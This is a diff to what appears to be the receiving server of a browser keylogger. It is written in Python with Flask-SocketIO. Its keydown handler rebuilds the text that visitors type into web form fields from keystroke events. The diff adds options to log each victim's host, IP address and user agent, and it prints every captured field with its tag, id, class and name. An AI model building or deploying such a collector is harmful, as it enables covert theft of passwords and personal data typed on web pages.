@@ -11,6 +11,11 @@ app.config['SECRET_KEY'] = 'secret'
 socketio = SocketIO(app)
 
 hosts = {}
+configs = {
+    'user_agents' : False,
+    'clients' : False,
+    'hosts' : False,
+}
 
 @app.route('/')
 def index():
@@ -100,8 +105,18 @@ def keydown(message):
 
         contents.insert(selection_start, keystroke)
 
-    print message['data']['tag_details']['name'], '-->',
-    print ''.join(contents)
+    if configs['hosts']:
+        print '[', host, ']',
+    if configs['clients']:
+        print '[', ip ,']',
+    if configs['user_agents']:
+        print '[', message['page_details']['user_agent'], ']',
+    print '<%s id="%s" class="%s" name="%s">: %s' %\
+        (message['data']['tag_details']['tag'],
+         message['data']['tag_details']['id'],
+         message['data']['tag_details']['class'],
+         message['data']['tag_details']['name'],
+         ''.join(contents))
 
 if __name__ == '__main__':
     socketio.run(app)
